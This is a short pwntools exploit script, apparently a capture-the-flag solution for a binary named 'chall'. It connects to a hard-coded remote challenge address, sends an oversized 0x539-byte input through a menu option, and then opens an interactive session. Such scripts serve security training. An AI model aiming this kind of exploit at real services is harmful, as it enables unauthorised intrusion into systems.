#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12344)
else:
        p = process(exe.path)

GDB()
sla(b"Option: ", b"2")
sa(b": ", b"a" * 0x539)
sla(b"Option: ", b"1")
sla(b"> ", b"a")

p.interactive()

